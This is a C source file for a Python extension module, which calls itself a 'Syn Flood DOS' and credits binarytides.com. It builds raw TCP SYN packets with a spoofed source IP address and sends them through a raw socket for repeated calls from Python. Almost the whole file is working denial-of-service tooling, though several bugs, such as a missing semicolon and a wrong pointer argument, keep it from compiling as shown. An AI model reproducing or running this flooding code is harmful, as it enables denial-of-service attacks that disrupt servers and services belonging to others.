/*
    Syn Flood DOS with LINUX sockets, thanks binarytides.com!
*/
#define __USE_BSD 1 //Set linux ip headers to use BSD style headers
#define __FAVOR_BSD 1 //Set linux tcp headers to use BSD style headers
#include <stdio.h>
#include <netinet/tcp.h>   //Provides declarations for tcp header
#include <netinet/ip.h>    //Provides declarations for ip header
#include <Python.h>
 
typedef struct pseudo_header    //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    //char tcp[28];
    struct tcphdr tcp;
};
 
unsigned short csum(unsigned short *ptr,int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
 
    return(answer);
}

//Socket
int s;
//Datagram to represent the packet
char datagram[4096];
//IP header
struct ip *iph = (struct ip *)datagram;
//TCP header
struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
struct sockaddr_in sin2;
struct pseudo_header psh;

static PyObject * synmod_send(PyObject *self, PyObject* args)
{
    if (sendto (s,      /* our socket */
                datagram,   /* the buffer containing headers and data */
                iph->ip_len,    /* total length of our datagram */
                0,      /* routing flags, normally always 0 */
                (struct sockaddr *)&sin2,   /* socket addr, just like in */
                sizeof(sin2)) < 0)       /* a normal send() */

        printf("error\r\n");

    return PyInt_FromLong(42L);
}

static PyObject * synmod_init(PyObject *self, PyObject* args)
{
    int src_port, dest_port, ok;
    const char *src_addr, *dest_addr;
    struct in_addr conv_src_addr, conv_dest_addr;

    ok = PyArg_ParseTuple(args, "sisi", &src_addr, &src_port, &dest_addr, &dest_port);

    if(!ok)
    {
        printf("Python parsing failed\r\n");
        return PyInt_FromLong(0L);;
    }

    printf("Using src %s:%i dest %s:%i\r\n", src_addr, src_port, dest_addr, dest_port);

    ok = inet_pton(AF_INET, src_addr, &conv_src_addr);

    if(!ok)
    {
        printf("src_addr conversion failed\r\n");
        return PyInt_FromLong(0L);;
    }

    ok = inet_pton(AF_INET, dest_addr, conv_dest_addr);

    if(!ok)
    {
        printf("dest_addr conversion failed\r\n");
        return PyInt_FromLong(0L);;
    }

    //Create a raw socket
    s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
    sin2.sin_family = AF_INET; //dest addr
    sin2.sin_port = htons(dest_port);
    sin2.sin_addr.s_addr = inet_addr(dest_addr);
 
    memset(datagram, 0, 4096); /* zero out the buffer */
 
    //Fill in the IP Header
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htonl(54321); //Id of this packet
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;      //Set to 0 before calculating checksum
    iph->ip_src = conv_src_addr;  //Spoof the source ip address
    iph->ip_dst = conv_dest_addr;
 
    iph->ip_sum = csum((unsigned short *)datagram, iph->ip_len >> 1);
 
    //TCP Header
    tcph->th_sport = htons(src_port);
    tcph->th_dport = htons(dest_port);
    tcph->th_seq = 0;
    tcph->th_ack = 0;
    tcph->th_off = 5;      /* first and only tcp segment */
    /*tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;*/
    tcph->th_flags = TH_SYN
    tcph->th_win = htons(5840); /* maximum allowed window size */
    tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
                should fill in the correct checksum during transmission */
    tcph->urp = 0;
    //Now the IP checksum
 
    psh.source_address = inet_addr(src_addr);
    psh.dest_address = sin2.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
 
    memcpy(&psh.tcp , tcph , sizeof(struct tcphdr));
 
    tcph->th_sum = csum((unsigned short*) &psh , sizeof(struct pseudo_header));
 
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        {
            printf("Warning: Cannot set HDRINCL!\r\n");
            return PyInt_FromLong(0L);
        }
    }

    return PyInt_FromLong(42L);
}


static PyMethodDef SYNModMethods[] = {
    {"init",  synmod_init, METH_VARARGS, ""},
    {"send",  synmod_send, METH_VARARGS, ""},
    {NULL, NULL, 0, NULL}        /* Sentinel */
};

PyMODINIT_FUNC initsynmod(void)
{
    PyObject *m;
    PyImport_AddModule("synmod");
    m = Py_InitModule("synmod", SYNModMethods);
    if (m == NULL)
        return;
}
